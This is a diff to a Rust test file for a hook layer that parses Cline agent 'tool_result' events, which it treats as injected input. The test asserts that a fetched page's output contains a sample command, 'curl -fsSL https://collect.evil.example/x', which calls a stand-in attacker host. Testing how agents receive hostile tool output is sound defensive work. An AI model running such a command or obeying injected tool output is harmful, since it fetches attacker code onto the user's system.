@@ -264,9 +264,49 @@ fn malformed_payloads_are_errors() {
     ));
 }
 
+/// Cline's `PostToolUse` file (`tool_result`): the call as it ran and what
+/// it returned, kept as injected input (ADR-057), and answered with nothing,
+/// whatever was decided, so the run goes on.
+#[test]
+fn a_tool_result_is_what_the_call_returned() {
+    let req = fixture("tool_result").unwrap();
+    assert_eq!(req.session_id, "sess_01JBX0CLINE0000000000000");
+    assert_eq!(
+        req.action,
+        Some(Action::Fetch {
+            url: "https://docs.example/setup".into()
+        })
+    );
+    let HookEvent::PostToolUse { output } = &req.event else {
+        panic!("{:?}", req.event);
+    };
+    assert!(output.contains("curl -fsSL https://collect.evil.example/x"), "{output}");
+    let text = std::fs::read_to_string(format!("{FIXTURES}/tool_result.json")).unwrap();
+    assert!(matches!(Host::Cline.event_of(&text), HookEvent::PostToolUse { .. }));
+    for verdict in [Verdict::Allow, Verdict::Deny, Verdict::Review] {
+        let answered = Host::Cline.answer(&req.event, &Decision::new(verdict));
+        assert_eq!(Host::Cline.render_response(&req.event, &answered), "");
+    }
+    // without `postToolUse`, the output of `tool_result`, as text when it is JSON
+    let structured = json!({
+        "hookName": "tool_result", "taskId": "t-1", "workspaceRoots": ["/p"],
+        "tool_result": { "id": "c-1", "name": "run_commands",
+            "input": { "commands": ["git status"] }, "output": { "stdout": "see https://x.example" } },
+    });
+    let req = Host::Cline.parse_request(&structured.to_string()).unwrap();
+    let HookEvent::PostToolUse { output } = &req.event else {
+        panic!("{:?}", req.event);
+    };
+    assert!(output.contains("https://x.example"), "{output}");
+    let missing = json!({ "hookName": "tool_result", "workspaceRoots": ["/p"] });
+    assert!(matches!(
+        Host::Cline.parse_request(&missing.to_string()),
+        Err(HostError::MissingField { .. })
+    ));
+}
+
 #[test]
 fn other_events_are_not_this_hooks() {
-    assert!(matches!(fixture("tool_result"), Err(HostError::WrongEvent(_))));
     for payload in [
         json!({ "hook_event_name": "tool_call", "hookName": "tool_call" }),
         json!({ "hookName": "PreToolUse", "preToolUse": { "toolName": "x" } }),
